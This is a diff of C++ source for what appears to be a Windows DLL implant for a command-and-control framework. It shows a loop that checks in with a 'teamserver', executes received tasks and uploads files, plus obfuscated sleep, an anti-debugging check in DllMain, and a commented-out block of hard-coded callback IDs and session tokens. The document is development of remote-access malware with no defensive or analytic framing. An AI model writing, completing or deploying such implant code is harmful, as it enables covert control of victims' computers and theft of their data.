@@ -2,13 +2,6 @@
 #pragma comment(lib,"winhttp.lib")
 #pragma comment(lib,"netapi32.lib")
 
-command_output
-process_command(
-        _In_ const std::string& command_str,
-        _In_ const char delimeter,
-        _In_ const implant_context& ctx
-);
-
 
 //
 // for testing purposes
@@ -86,11 +79,11 @@ receive_commands(implant_context& ctx) {
             ctx.is_https,
             task
         )) {
-            DEBUG_PRINT("[!] Initial teamserver checkin failed. Response: %s\n", task.c_str());
+            DEBUG_PRINT("[!] Initial teamserver checkin failed.");
             return false;
         }
 
-        DEBUG_PRINT("[+] Successfully initialized connection with teamserver.\n");
+        DEBUG_PRINT("[+] Successfully checked in with teamserver.\n");
         DEBUG_PRINT("[+] Address: %s Port: %u\n", ctx.server_addr.c_str(), ctx.port);
     #pragma endregion
 
@@ -133,7 +126,7 @@ receive_commands(implant_context& ctx) {
 
 
         #pragma region process_command
-            auto [txt_output, file_to_upload, type] = process_command(task, COMMAND_DELIMITER, ctx);
+            auto [txt_output, file_to_upload, type] =  dispatch::process_command(task, COMMAND_DELIMITER, ctx);
             obfus::sleep(ctx.sleep_time);
             bool success = false;
         #pragma endregion
@@ -179,42 +172,46 @@ receive_commands(implant_context& ctx) {
 
 
 
-//
-// TODO: add CFG valid call targets for sleep obf
-//
-
 BOOL APIENTRY DllMain(
     HMODULE hModule,
     DWORD  ul_reason_for_call,
     LPVOID lpReserved
 ) {
 
+    /*
     implant_context ctx;
-    ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
-    ctx.session_token = "SHBlckk2MHZ3dzk3WWFMTDRWWjlUbkhmaA==";
+    ctx.callback_object = "aa2cdea1-012b-493d-4489-5c012c1da1c5";
+    ctx.session_token = "emV6Uk93R3NvR0t5Rlp4VkRRbEFoeTA1cw==";
     ctx.server_addr = "127.0.0.1";
     ctx.port = 8081;
     ctx.is_https = false;
     ctx.user_agent = "test program/1.0";
     ctx.sleep_time = 2500;
     ctx.jitter = 0;
+    */
+    std::string buff;
 
     switch (ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
             DEBUG_PRINT("[+] process attach.\n");
-            if(!receive_commands(ctx)) {
-                DEBUG_PRINT("[!] initialization failed.\n");
-                return FALSE;
+            if(anti_analysis::being_debugged()) {
+                std::cout << "we're being debugged!!" << std::endl;
+                return TRUE;
             }
 
-            break;
+            std::cout << "We aren't being debugged." << std::endl;
+
+            return TRUE;
+
         case DLL_THREAD_ATTACH:
             DEBUG_PRINT("[+] thread attach.\n");
             break;
+
         case DLL_THREAD_DETACH:
             DEBUG_PRINT("[+] thread detach.\n");
             break;
+
         case DLL_PROCESS_DETACH:
             DEBUG_PRINT("[+] process detach.\n");
             break;
